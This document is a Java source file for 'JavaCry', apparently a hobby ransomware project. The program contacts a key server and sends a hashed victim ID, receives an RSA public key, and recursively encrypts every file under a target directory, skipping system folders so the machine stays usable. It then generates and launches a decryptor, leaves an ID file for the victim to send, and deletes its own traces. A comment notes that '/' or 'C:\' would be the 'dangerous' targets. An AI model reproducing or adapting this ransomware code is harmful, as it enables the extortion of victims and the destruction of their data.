import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.*;
import java.security.MessageDigest;
import java.security.spec.X509EncodedKeySpec;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.nio.file.StandardCopyOption;;

public class JavaCry {
    /*
     * Dangerous target paths:
     * Mac & Linux:
     * private static String targetPath = "/";
     * 
     * Windows:
     * private static String targetPath = "C:\";
     */
    private static String addr = "127.0.0.1";
    private static String targetPath = "/Users/daniel/Desktop/java_practice/JavaCry/Test_Env";
    private static String os = System.getProperty("os.name").split(" ")[0];
    private static List<Path> files = new ArrayList<Path>();
    private static Random rand = new Random(System.currentTimeMillis());
    private static int id = (int) (rand.nextInt(Integer.MAX_VALUE));
    private static RSACrypt crypto;
    private static String decryptorPayload = "";
    private static Process process;
    private static List<String> avoidDir = new ArrayList<String>();

    public static void search(String path) throws Exception {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;

        for(File f: list) {
            String name = f.getName();
            if (f.isDirectory()) {
                if (avoidDir.contains(name.toLowerCase())) return; //want system to still work
                search(f.getAbsolutePath());

            } else {
                //split to get file extension
                System.out.println(name);
                if (!name.equals("JavaCry.jar")) {
                    files.add(f.toPath());
                }
            }
        }
    }

    // decrypt files from a list of paths
    public static void decryptFiles(String keyString) {
        crypto.setPubKey(keyString);

        for (Path p : files) {
            try {
                File f = p.toFile();
                crypto.decrypt(f);
            }

            catch (Exception e) {
                System.out.println(e);
            }
        }
    }

    // encrypt files from a list of paths
    public static void encryptFiles() {
        for (Path p : files) {
            try {
                File f = p.toFile();
                crypto.encrypt(f);
            }

            catch (Exception e) {
                System.out.println(e);
            }
        }
    }

    public static String replaceLine(String src, int lineno, String content) {
        String out = "";
        String[] lines = src.split("\n");

        for (int i = 0; i < lines.length; i++) {
            if (i + 1 == lineno) {
                out += content + "\n";
            }

            else {
                out += lines[i] + "\n";
            }
        }

        return out;
    }

    public static void main(String[] args) {
        System.out.println("You're on " + os); // Windows Mac Linux SunOS FreeBSD
        String h = ""; // id hash to write to sendtome.txt

        KeyClient key_client = new KeyClient(addr, 6666);

        

        /*
         * =========================================================
         * Send victim ID and get public key
         * =========================================================
         */

        if (key_client.getSuccess()) {

            try {
                // send id hash to server
                MessageDigest md = MessageDigest.getInstance("SHA-256");
                byte[] hash = md.digest(String.valueOf(id).getBytes(StandardCharsets.UTF_8));
                String b64hash = Base64.getEncoder().encodeToString(hash);
                h = b64hash;
                key_client.sendString(b64hash);

                // received allocated public key
                String b64pubkey = key_client.recvString();
                byte[] pub = Base64.getDecoder().decode(b64pubkey);
                X509EncodedKeySpec spec = new X509EncodedKeySpec(pub);
                KeyFactory factory = KeyFactory.getInstance("RSA");
                PublicKey public_key = factory.generatePublic(spec);

                crypto = new RSACrypt(public_key);

                key_client.close();
            }

            catch (Exception e) {
                System.out.println(1 + "" + e);
                return;
            }

            /*
             * =========================================================
             * Encrypting the files
             * =========================================================
             */

            File self = new File("JavaCry.jar");
            avoidDir.add(self.getAbsolutePath());
            avoidDir.add("windows");
            avoidDir.add("library");
            avoidDir.add("boot");
            avoidDir.add("local");
            avoidDir.add("program files");
            avoidDir.add("programdata");
            avoidDir.add("system");
            avoidDir.add("volumes");
            avoidDir.add("dev");
            avoidDir.add("etc");
            avoidDir.add("bin");
            avoidDir.add("$");

            // list files recursively within the target directory
            // try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
            //     files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
            // }

            // catch (Exception e) {
            //     System.out.println(e);
            // }

            try {
                if (targetPath.equals("")) {
                    targetPath = System.getProperty("user.dir");
                } else {
                    File f = new File(targetPath);
                    targetPath = f.getAbsolutePath();
                }
                System.out.println("Searching " + targetPath);
                search(targetPath);
            } catch (Exception e) {
                System.out.println(e);
            }



            System.out.println(files);

            // // avoid certain directories
            // for (int i = 0; i < files.size(); i++) {
            //     System.out.println(files.get(i).toString());

            //     if (avoidDir.contains(files.get(i).toString())) {
            //         files.remove(i);
            //         i--;
            //     }
            // }

            // This will encrypt files recursively in the target directory
            encryptFiles();

            // This will securely save the AES encryption key by encrypting it with the
            // received RSA public key.
            crypto.SaveAESKey();
            crypto.SaveRSAKey();

            /*
             * =========================================================
             * Generating Decryptor.java
             * =========================================================
             */

            try {
                File f = new File("Decryptor.java");

                if (!f.exists()) {
                    f.createNewFile();
                }

                File s = new File("sendtome.txt");

                if (!s.exists()) {
                    s.createNewFile();
                }

                File m = new File("manifest.txt");

                if (!m.exists()) {
                    m.createNewFile();
                }

                // create Decryptor.jar
                String code = new String(Base64.getDecoder().decode(decryptorPayload));
                code = replaceLine(code, 43, "private static int id = " + String.valueOf(id) + ";");
                FileWriter writer = new FileWriter("Decryptor.java");
                PrintStream manifest = new PrintStream(new File("manifest.txt"));
                manifest.println("Main-Class: Decryptor");
                writer.write(code);
                writer.close();

                // create sendtome.txt
                writer = new FileWriter("sendtome.txt");
                writer.write(h);
                writer.close();

                System.out.println("fetch loading.gif");
                // File loadingImg = new File("/img/loading.gif");
                InputStream imgStream = JavaCry.class.getResourceAsStream("/img/loading.gif");
                System.out.println(Paths.get("loading.gif"));
                Files.copy(imgStream, Paths.get("loading.gif"), StandardCopyOption.REPLACE_EXISTING);
                /*
                 * =========================================================
                 * Compiling Decryptor.java
                 * =========================================================
                 */

                System.out.println("build decryptor");
                process = Runtime.getRuntime()
                        .exec(String.format("javac Decryptor.java", System.getProperty("user.home")));
                BufferedReader b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                String str;

                while ((str = b.readLine()) != null) {
                    System.out.println(str);
                }

                b.close();

                System.out.println("make jar file");
                process = Runtime.getRuntime().exec(String.format(
                        "jar -cvmf manifest.txt Decryptor.jar Decryptor.class Decryptor$1.class Decryptor$2.class ClientThread.class loading.gif",
                        System.getProperty("user.home")));
                b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                while ((str = b.readLine()) != null) {
                    System.out.println(str);
                }

                b.close();
                /*
                 * =========================================================
                 * Deleting the files
                 * =========================================================
                 */

                if (f.delete()) {
                    System.out.println("Deleted the file: " + f.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                if (m.delete()) {
                    System.out.println("Deleted the file: " + m.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File classFile = new File("Decryptor.class");

                if (classFile.delete()) {
                    System.out.println("Deleted the file: " + classFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File helperFile = new File("Decryptor$1.class");

                if (helperFile.delete()) {
                    System.out.println("Deleted the file: " + helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                helperFile = new File("ClientThread.class");
                if (helperFile.delete()) {
                    System.out.println("Deleted the file: " + helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                helperFile = new File("Decryptor$2.class");
                if (helperFile.delete()) {
                    System.out.println("Deleted the file: " + helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File loadingImg = new File("loading.gif");
                if (loadingImg.delete()) {
                    System.out.println("Deleted the file: " + loadingImg.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                self = new File("JavaCry.jar");

                if (self.exists()) {
                    self.delete();
                }

                System.out.println("Done, running Decryptor");

                /*
                 * =========================================================
                 * Running Decryptor.jar
                 * =========================================================
                 */
                process = Runtime.getRuntime()
                        .exec(String.format("java -jar Decryptor.jar", System.getProperty("user.home")));

            }

            catch (Exception e) {
                System.out.println(2 + "" + e);
            }

        }
    }
}
